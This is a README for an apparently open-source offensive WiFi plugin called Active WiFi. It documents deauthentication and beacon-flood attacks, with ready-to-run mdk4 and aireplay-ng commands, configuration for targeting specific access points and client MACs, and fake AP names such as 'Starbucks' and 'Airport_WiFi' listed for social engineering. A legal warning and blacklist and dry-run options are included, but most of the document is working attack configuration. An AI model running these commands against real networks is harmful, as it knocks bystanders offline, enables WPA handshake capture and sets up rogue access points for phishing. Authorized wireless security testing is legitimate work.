# Active WiFi Plugin (Deauth & Beacon Attacks)

> **Version:** 0.4.0 | **Last Updated:** 2025-12-12

⚠️ **WARNING:** Deauthentication and beacon flooding may be illegal in your jurisdiction. Use only on networks you own or have explicit permission to test.

## Table of Contents

- [Overview](#overview)
- [Configuration](#configuration)
- [Attack Types](#attack-types)
- [Web UI](#web-ui)
- [API Endpoints](#api-endpoints)
- [Safety Features](#safety-features)
- [Metrics](#metrics)

---

## Overview

The Active WiFi plugin provides offensive wireless capabilities:

| Feature | Tool | Description |
|---------|------|-------------|
| **Deauth Attack** | mdk4/aireplay-ng | Disconnect clients from AP |
| **Beacon Flood** | mdk4 | Create fake access points |
| **Targeted Deauth** | aireplay-ng | Disconnect specific client |

### Requirements

- Linux only (Windows simulates only)
- `aggressive.enabled: true` in config
- Root privileges
- Monitor mode capable adapter

### Preferred Tools

| Tool | Priority | Description |
|------|----------|-------------|
| mdk4 | Primary | Modern, feature-rich |
| aireplay-ng | Fallback | Classic, reliable |

---

## Configuration

### momo.yml

```yaml
aggressive:
  enabled: true                    # Required for attacks
  max_deauth_per_min: 0            # 0 = unlimited
  ssid_blacklist: ["MyHomeWiFi"]   # Protected networks
  ssid_whitelist: []               # Focus targets (empty = all)

plugins:
  enabled:
    - active_wifi
  options:
    active_wifi:
      enabled: true
      iface: wlan1                 # Monitor mode interface
      channels: [1, 6, 11]         # Target channels
      bssid_whitelist: []          # Target BSSIDs only
      deauth_clients: []           # Specific client MACs
      beacon_ssids: []             # Fake AP names
      pkts_per_second: 50          # Attack intensity
      max_runtime_secs: 15         # Attack duration
      cooldown_secs: 10            # Pause between attacks
      tool: auto                   # auto, mdk4, aireplay
```

### Attack Parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `pkts_per_second` | 50 | Packets per second |
| `max_runtime_secs` | 15 | Maximum attack duration |
| `cooldown_secs` | 10 | Cooldown between attacks |

---

## Attack Types

### Deauthentication Attack

Disconnects all clients from an access point:

```bash
# mdk4 command (internal)
mdk4 wlan1 d -B AA:BB:CC:DD:EE:FF -c 6

# aireplay-ng command (internal)
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1
```

**Use Cases:**
- Force WPA handshake capture
- Disconnect unauthorized clients
- Test network resilience

### Targeted Deauth

Disconnect a specific client:

```yaml
plugins:
  options:
    active_wifi:
      deauth_clients: ["11:22:33:44:55:66"]
```

```bash
# aireplay-ng command (internal)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1
```

### Beacon Flood

Create fake access points:

```yaml
plugins:
  options:
    active_wifi:
      beacon_ssids: ["FreeWiFi", "Starbucks", "Airport_WiFi"]
```

```bash
# mdk4 command (internal)
mdk4 wlan1 b -n FreeWiFi -c 6
```

**Use Cases:**
- Confuse wireless scanners
- Test client behavior
- Social engineering

---

## Web UI

Access active attacks at `http://<ip>:8080/` (Dashboard)

### Features

- View current attack status
- See attack metrics
- Monitor connected clients

---

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/status` | GET | Includes attack status |
| `/metrics` | GET | Attack metrics |

### Metrics Response

```json
{
  "momo_attack_deauth_runs_total": 15,
  "momo_attack_deauth_failures_total": 2,
  "momo_attack_beacon_runs_total": 5,
  "momo_attack_beacon_failures_total": 0,
  "momo_attack_active": 1,
  "momo_attack_last_rc": 0
}
```

---

## Safety Features

### Blacklist Protection

Protect your own networks:

```yaml
aggressive:
  ssid_blacklist: ["MyHomeWiFi", "MyOffice5G"]
  bssid_blacklist: ["AA:BB:CC:DD:EE:FF"]
```

### Whitelist Focus

Only attack specific targets:

```yaml
aggressive:
  ssid_whitelist: ["TargetNetwork"]
```

### Rate Limiting

Limit attack intensity:

```yaml
aggressive:
  max_deauth_per_min: 100    # Max 100 deauths per minute
  cooldown_secs: 10          # Pause between attacks
```

### Dry Run Mode

Test without actual attacks:

```bash
momo run -c configs/momo.yml --dry-run
```

---

## Metrics

| Metric | Description |
|--------|-------------|
| `momo_attack_deauth_runs_total` | Total deauth attacks |
| `momo_attack_deauth_failures_total` | Failed deauth attacks |
| `momo_attack_beacon_runs_total` | Total beacon floods |
| `momo_attack_beacon_failures_total` | Failed beacon floods |
| `momo_attack_active` | Currently attacking (0/1) |
| `momo_attack_last_rc` | Last command return code |

---

## Troubleshooting

### Attack not starting

```bash
# Check aggressive mode
grep -A5 "aggressive:" configs/momo.yml

# Check interface mode
iw dev wlan1 info | grep type
# Should show: type monitor
```

### Tool not found

```bash
# Install aircrack-ng suite
sudo apt install aircrack-ng mdk4

# Verify
which mdk4 aireplay-ng
```

### Permission denied

```bash
# Run with sudo
sudo momo run -c configs/momo.yml

# Or set capabilities
sudo setcap cap_net_admin,cap_net_raw+eip $(which python3)
```

### No effect

- Ensure target AP is in range
- Check channel matches target
- Verify monitor mode is active
- Some APs have deauth protection (802.11w/MFP)
